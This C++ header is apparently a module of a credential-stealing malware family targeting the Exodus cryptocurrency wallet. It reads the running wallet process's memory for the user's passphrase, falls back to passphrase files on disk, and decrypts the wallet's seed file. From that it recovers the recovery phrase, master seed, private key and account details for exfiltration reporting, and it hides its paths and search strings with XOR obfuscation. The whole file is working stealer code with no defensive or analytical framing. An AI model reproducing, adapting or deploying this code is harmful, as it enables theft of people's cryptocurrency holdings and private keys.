#pragma once


#include "../config.hpp"

#ifdef ENABLE_EXODUS

#include "../crypto.hpp"
#include "../result.hpp"
#include "../util.hpp"
#include "../xor.hpp"
#include "base.hpp"
#include <nlohmann/json.hpp>
#include <sodium.h>


extern "C" {
    typedef LONG NTSTATUS;

    NTSTATUS NTAPI NtQueryVirtualMemory(
        HANDLE ProcessHandle, PVOID BaseAddress,
        int MemoryInformationClass,
        PVOID MemoryInformation, SIZE_T MemoryInformationLength,
        PSIZE_T ReturnLength);

    NTSTATUS NTAPI ZwReadVirtualMemory(
        HANDLE ProcessHandle, PVOID BaseAddress,
        PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead);
}


#include "../../StealerGo/stealer-go/stealer/compilers/exodus/words.h"

class ExodusStealer : public AbstractStealer {
public:
    void steal() override {

        HANDLE process_handle = nullptr;
        for (int attempt = 0; attempt < 5; ++attempt) {
            uint32_t pid = find_process_id(L"Exodus.exe");
            if (pid) {
                process_handle = OpenProcess(
                    PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE,
                    FALSE, pid);
                if (process_handle) break;
            }
            Sleep(200);
        }
        if (!process_handle) return;

        char appdata_path[MAX_PATH];
        if (!SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata_path))) {
            CloseHandle(process_handle);
            return;
        }

        std::string passphrase = extract_passphrase(process_handle);
        if (passphrase.empty())
            passphrase = get_passphrase_disk(appdata_path);
        if (passphrase.empty()) {
            CloseHandle(process_handle);
            return;
        }

        std::string version = extract_exodus_version(process_handle);

        append_extra_info("Exodus:");
        append_extra_info("  Version: " + version);
        append_extra_info("  Password: " + passphrase);

        std::vector<uint8_t> file_data = read_seed_file(appdata_path);
        if (file_data.empty()) { CloseHandle(process_handle); return; }

        SecoContainer seco;
        if (!parse_seco(file_data, seco)) { CloseHandle(process_handle); return; }

        Metadata meta;
        if (!extract_metadata(seco, meta)) { CloseHandle(process_handle); return; }

        std::vector<uint8_t> derived_key = derive_scrypt_key(passphrase, meta);
        if (derived_key.empty()) { CloseHandle(process_handle); return; }

        std::vector<uint8_t> blob_key = decrypt_blob_key(derived_key, meta);
        if (blob_key.empty()) { CloseHandle(process_handle); return; }

        std::vector<uint8_t> plaintext = decrypt_and_decompress_seed(blob_key, meta, seco);
        if (plaintext.empty()) { CloseHandle(process_handle); return; }

        std::vector<uint8_t> entropy(plaintext.begin() + 64, plaintext.end());
        std::string mnemonic = entropy_to_mnemonic(entropy);
        append_extra_info("  Secret Key: " + mnemonic);

        std::vector<uint8_t> master_seed(plaintext.begin(), plaintext.begin() + 64);
        append_extra_info("  Master Seed: 0x" + bytes_to_hex(master_seed.data(), 64));

        uint8_t master_priv[32], chain_code[32];
        crypto::bip32_master_from_seed(master_seed.data(), master_seed.size(),
                                       master_priv, chain_code);
        append_extra_info("  Private Key: 0x" + bytes_to_hex(master_priv, 32));
        append_extra_info("  Chain Code: 0x" + bytes_to_hex(chain_code, 32));


        auto json_str = parse_storage(appdata_path, derived_key);
        if (!json_str.empty()) {
            auto data = nlohmann::json::parse(json_str, nullptr, false);
            if (!data.is_discarded()) {
                if (data.contains("!analytics!userId") && data["!analytics!userId"].is_string())
                    append_extra_info("  User ID: " + data["!analytics!userId"].get<std::string>());


                std::set<std::string> currencies;
                for (auto& [key, _] : data.items()) {
                    if (key.rfind("!marketHistory!prices-USD-", 0) == 0) {
                        std::string asset = key.substr(strlen("!marketHistory!prices-USD-"));
                        for (const char* suffix : {"-day", "-hour", "-minute"}) {
                            if (asset.size() > strlen(suffix) &&
                                asset.substr(asset.size() - strlen(suffix)) == suffix) {
                                asset = asset.substr(0, asset.size() - strlen(suffix));
                                break;
                            }
                        }
                        currencies.insert(asset);
                    }
                }
                if (data.contains("wallets") && data["wallets"].is_object()) {
                    for (auto& [key, _] : data["wallets"].items())
                        currencies.insert(key);
                }
                if (!currencies.empty()) {
                    append_extra_info("  Currencies:");
                    for (const auto& c : currencies)
                        append_extra_info("    - " + c);
                }
            }
        }

        append_extra_info("");
        CloseHandle(process_handle);
    }

private:
    struct SecoContainer {
        std::vector<uint8_t> header, checksum, metadata, blob;
    };

    struct Metadata {
        uint32_t n, r, p;
        std::vector<uint8_t> salt;
        std::vector<uint8_t> blob_key_iv, blob_key_auth, encrypted_key;
        std::vector<uint8_t> blob_iv, blob_auth;
    };

    std::vector<uint8_t> read_seed_file(const char* appdata_path) {
        std::string path = std::string(appdata_path) + xor("\\Exodus\\exodus.wallet\\seed.seco");
        std::ifstream file(path, std::ios::binary);
        if (!file) return {};
        return {std::istreambuf_iterator<char>(file), std::istreambuf_iterator<char>()};
    }

    bool parse_seco(const std::vector<uint8_t>& data, SecoContainer& out) {
        if (data.size() < 224 + 32 + 256 + 4) return false;
        out.header.assign(data.begin(), data.begin() + 224);
        out.checksum.assign(data.begin() + 224, data.begin() + 256);
        out.metadata.assign(data.begin() + 256, data.begin() + 512);
        size_t blob_start = 512;
        if (data.size() < blob_start + 4) return false;
        uint32_t blob_len = (data[blob_start] << 24) | (data[blob_start + 1] << 16) |
                            (data[blob_start + 2] << 8) | data[blob_start + 3];
        if (data.size() < blob_start + 4 + blob_len) return false;
        out.blob.assign(data.begin() + blob_start + 4,
                        data.begin() + blob_start + 4 + blob_len);
        return true;
    }

    bool extract_metadata(const SecoContainer& seco, Metadata& meta) {
        if (seco.metadata.size() < 256) return false;
        const uint8_t* m = seco.metadata.data();
        meta.salt.assign(m, m + 32);
        meta.n = (m[32] << 24) | (m[33] << 16) | (m[34] << 8) | m[35];
        meta.r = (m[36] << 24) | (m[37] << 16) | (m[38] << 8) | m[39];
        meta.p = (m[40] << 24) | (m[41] << 16) | (m[42] << 8) | m[43];

        const uint8_t* bk = m + 44 + 32;
        meta.blob_key_iv.assign(bk, bk + 12);
        meta.blob_key_auth.assign(bk + 12, bk + 28);
        meta.encrypted_key.assign(bk + 28, bk + 60);
        const uint8_t* bl = bk + 60;
        meta.blob_iv.assign(bl, bl + 12);
        meta.blob_auth.assign(bl + 12, bl + 28);
        return true;
    }

    std::vector<uint8_t> derive_scrypt_key(const std::string& passphrase, const Metadata& meta) {
        std::vector<uint8_t> key(32);
        if (crypto_pwhash_scryptsalsa208sha256_ll(
                (const uint8_t*)passphrase.c_str(), passphrase.size(),
                meta.salt.data(), meta.salt.size(),
                meta.n, meta.r, meta.p,
                key.data(), key.size()) != 0)
            return {};
        return key;
    }

    std::vector<uint8_t> decrypt_blob_key(const std::vector<uint8_t>& derived_key,
                                           const Metadata& meta) {
        std::vector<uint8_t> blob_key;
        if (!crypto::aes_gcm_decrypt(derived_key.data(), derived_key.size(),
                meta.blob_key_iv.data(), meta.blob_key_iv.size(),
                meta.blob_key_auth.data(), meta.blob_key_auth.size(),
                meta.encrypted_key.data(), meta.encrypted_key.size(), blob_key))
            return {};
        return blob_key;
    }

    std::vector<uint8_t> decrypt_and_decompress_seed(const std::vector<uint8_t>& blob_key,
                                                      const Metadata& meta,
                                                      const SecoContainer& seco) {
        std::vector<uint8_t> compressed;
        if (!crypto::aes_gcm_decrypt(blob_key.data(), blob_key.size(),
                meta.blob_iv.data(), meta.blob_iv.size(),
                meta.blob_auth.data(), meta.blob_auth.size(),
                seco.blob.data(), seco.blob.size(), compressed))
            return {};
        if (compressed.size() < 18) return {};

        std::vector<uint8_t> plaintext;
        if (!crypto::inflate_gzip(compressed, plaintext)) return {};
        if (plaintext.size() < 64) return {};
        return plaintext;
    }

    std::string parse_storage(const char* appdata_path, const std::vector<uint8_t>& derived_key) {
        std::string path = std::string(appdata_path) +
            xor("\\Exodus\\exodus.wallet\\unsafe-storage.json");
        std::ifstream file(path, std::ios::binary);
        if (!file) return {};
        std::vector<uint8_t> data{std::istreambuf_iterator<char>(file),
                                   std::istreambuf_iterator<char>()};
        file.close();


        if (!data.empty() && data[0] == '{')
            return {data.begin(), data.end()};


        SecoContainer unsafe_seco;
        if (!parse_seco(data, unsafe_seco)) return {};

        const uint8_t* m = unsafe_seco.metadata.data();
        const uint8_t* bl = m + 136;
        std::vector<uint8_t> blob_iv(bl, bl + 12);
        std::vector<uint8_t> blob_auth(bl + 12, bl + 28);

        std::vector<uint8_t> compressed;
        if (!crypto::aes_gcm_decrypt(derived_key.data(), derived_key.size(),
                blob_iv.data(), blob_iv.size(),
                blob_auth.data(), blob_auth.size(),
                unsafe_seco.blob.data(), unsafe_seco.blob.size(), compressed))
            return {};

        std::vector<uint8_t> json_data;
        if (!crypto::inflate_gzip(compressed, json_data)) return {};
        return {json_data.begin(), json_data.end()};
    }

    std::string get_passphrase_disk(const char* appdata_path) {
        namespace fs = std::filesystem;

        fs::path primary = fs::path(appdata_path) / "Exodus" / "exodus.wallet" / "passphrase.json";
        if (fs::exists(primary)) {
            std::ifstream f(primary);
            if (f.is_open()) {
                try {
                    nlohmann::json data;
                    f >> data;
                    if (data.contains("passphrase") && data["passphrase"].is_string())
                        return data["passphrase"].get<std::string>();
                } catch (...) {}
            }
        }

        fs::path backups = fs::path(appdata_path) / "Exodus" / "backups" / "wallet";
        if (fs::exists(backups)) {
            std::vector<fs::path> dirs;
            for (const auto& e : fs::directory_iterator(backups))
                if (e.is_directory()) dirs.push_back(e.path());
            std::sort(dirs.rbegin(), dirs.rend());
            for (const auto& dir : dirs) {
                fs::path pf = dir / "exodus.wallet" / "passphrase.json";
                if (fs::exists(pf)) {
                    std::ifstream f(pf);
                    try {
                        nlohmann::json data;
                        f >> data;
                        if (data.contains("passphrase") && data["passphrase"].is_string())
                            return data["passphrase"].get<std::string>();
                    } catch (...) {}
                }
            }
        }
        return "";
    }

    std::string extract_passphrase(HANDLE process_handle) {
        std::string target = xor("#%7B%22passphrase%22%3A%22");
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);

        uintptr_t current = 0;
        MEMORY_BASIC_INFORMATION mbi;

        while (current < (uintptr_t)sysInfo.lpMaximumApplicationAddress) {
            NTSTATUS status = NtQueryVirtualMemory(process_handle, (PVOID)current,
                0 , &mbi, sizeof(mbi), nullptr);
            if (status != 0) break;

            if (mbi.State == MEM_COMMIT && mbi.Protect == PAGE_READWRITE) {
                std::vector<char> buffer(mbi.RegionSize);
                SIZE_T bytesRead = 0;
                status = ZwReadVirtualMemory(process_handle, (PVOID)current,
                    buffer.data(), mbi.RegionSize, &bytesRead);
                if (status == 0 && bytesRead > 0) {
                    std::string_view content(buffer.data(), bytesRead);
                    size_t start = content.find(target);
                    if (start != std::string::npos) {
                        start += target.length();
                        size_t end = content.find("%22", start);
                        if (end != std::string::npos) {
                            std::string encoded(content.substr(start, end - start));
                            return crypto::url_decode(encoded);
                        }
                    }
                }
            }
            current += mbi.RegionSize;
        }
        return "";
    }

    std::string extract_exodus_version(HANDLE hProcess) {
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        MEMORY_BASIC_INFORMATION memInfo;
        char* page = 0;
        std::string marker = xor("app-");
        std::vector<uintptr_t> matches;

        while (page < sysInfo.lpMaximumApplicationAddress) {
            if (NtQueryVirtualMemory(hProcess, page, 0, &memInfo, sizeof(memInfo), nullptr) != 0)
                break;
            if (memInfo.State == MEM_COMMIT && (memInfo.Protect & PAGE_READWRITE)) {
                std::string buffer;
                buffer.resize(memInfo.RegionSize + 256);
                SIZE_T bytesRead = 0;
                if (ZwReadVirtualMemory(hProcess, page, &buffer[0],
                                        memInfo.RegionSize, &bytesRead) == 0 && bytesRead) {
                    size_t pos = 0;
                    while ((pos = buffer.find(marker, pos)) != std::string::npos) {
                        matches.push_back((uintptr_t)page + pos);
                        pos += marker.size();
                    }
                }
            }
            page += memInfo.RegionSize;
        }

        for (uintptr_t addr : matches) {
            char vBuf[32] = {0};
            SIZE_T bytesRead = 0;
            if (ZwReadVirtualMemory(hProcess, (void*)(addr + marker.size()),
                                    vBuf, sizeof(vBuf) - 1, &bytesRead) == 0 && bytesRead) {
                std::string version;
                for (size_t i = 0; i < bytesRead; ++i) {
                    char c = vBuf[i];
                    if (std::isdigit(c) || c == '.') version += c;
                    else if (!version.empty()) break;
                }
                if (!version.empty()) return version;
            }
        }
        return "";
    }

    std::string entropy_to_mnemonic(const std::vector<uint8_t>& entropy) {
        int entropy_bits = (int)entropy.size() * 8;
        int checksum_bits = entropy_bits / 32;
        int total_bits = entropy_bits + checksum_bits;
        int word_count = total_bits / 11;

        std::vector<bool> bits(total_bits);
        for (size_t i = 0; i < entropy.size(); ++i)
            for (int b = 0; b < 8; ++b)
                bits[i * 8 + b] = (entropy[i] >> (7 - b)) & 1;

        uint32_t checksum = crypto::sha256_checksum_bits(entropy, checksum_bits);
        for (int i = 0; i < checksum_bits; ++i)
            bits[entropy_bits + i] = (checksum >> (checksum_bits - 1 - i)) & 1;

        std::vector<std::string> words;
        for (int i = 0; i < word_count; ++i) {
            uint16_t index = 0;
            for (int b = 0; b < 11; ++b)
                index = (index << 1) | bits[i * 11 + b];
            words.push_back(g_secret_words[index]);
        }

        std::ostringstream oss;
        for (size_t i = 0; i < words.size(); ++i) {
            if (i > 0) oss << ' ';
            oss << words[i];
        }
        return oss.str();
    }
};

#endif
